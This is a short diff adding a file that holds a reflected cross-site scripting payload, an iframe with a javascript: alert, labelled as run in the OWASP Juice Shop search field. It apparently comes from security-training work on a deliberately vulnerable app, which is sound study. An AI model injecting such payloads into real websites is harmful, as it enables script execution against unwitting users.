@@ -1,0 +1,3 @@
+(* Reflected XSS Payolad that is executed in OWASP Juice Shop Search input field *)
+
+<iframe src=javascript:alert('Reflected-XSS-Success')>
